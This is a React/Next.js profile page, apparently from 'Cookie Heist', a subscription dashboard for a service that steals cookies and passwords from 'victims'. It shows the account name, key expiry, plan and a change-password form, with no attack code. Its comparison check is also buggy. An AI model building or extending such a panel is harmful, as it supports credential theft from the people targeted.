import Head from 'next/head'
import Header from '../components/header'
import { instance } from "../axios"
import { useState, useEffect } from 'react';
import Loading from '../components/loading';
import { useRouter } from 'next/router'
import Mobile from '../components/mobile';
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
export default function Login() {
  const [data, setData] = useState(null)
  const [key, setKey] = useState(null)
  const [isLoading, setLoading] = useState(false)
  const [token, setToken] = useState(null)

  const [email , setEmail ] = useState('')
  const [password , setPassword ] = useState('')

  const handleChangeEmail = (event) => {
    setEmail(event.target.value)
  }
  const handleChangePassword = (event) => {
    setPassword(event.target.value)
  }

  useEffect(() => {
    setLoading(true)
    instance.get('/user').then(res => {
      setData(res.data)
      instance.get('/key').then(res => {
        setKey(res.data)
        setLoading(false)
      }).catch()
    }).catch()
    setLoading(true)
  }, [])


  if (isLoading) return <Loading />
  if (!data) return <Loading />

  function notifyerr(a){
    toast.error(`${a}`);
  }
  function notifysucces(a){
    toast.success(`${a}`);
  }

  function change(){
    
      instance.post(`/changepassword` , { ancienpass: email, newpass : password })
              .then(res => {
                  if(res.data.message = "mot de passe changé"){
                    notifysucces('mot de passe changé !')
                  }
              })
              .catch(err => {
                notifyerr("mot de passse incorect")
              })
  }

  return (
    <div>
      <Head>
        <title>Cookie Heist - Profile</title>
        <meta name="description" content="Cookie heist pour récuperer les cookies et password" />
        <link rel="icon" type="image/png" href="/icon.png" />
      </Head>
      <Header />
      <Loading />
      <Mobile/>
      <div className='container_victimes'>
        <div className='container_paylaod_dashboard'>
          <div className='paylaod_profile'>
            <div className='container_pseudo_profile'>
              <p>{data.username}</p>
              <p>-</p>
              <p>{data.cle}</p>
            </div>
            <p>La Key expire le : {key.expire}</p>
            <p>Your plan : {key.plan}</p>
            <p>Change password :</p>
            <div className='container_change_password'>
              
              <div className="inputBox">
                <input type="password" required="required" value={email} onChange={handleChangeEmail} />
                <span>old password</span>
              </div>

              <div className="inputBox">
                <input type="password" required="required" value={password} onChange={handleChangePassword} />
                <span>New password</span>
              </div>

              <button onClick={change}>Enter</button>
            </div>
          </div>
        </div>
      </div>
      <ToastContainer position="bottom-right"/>
    </div>
  )
}
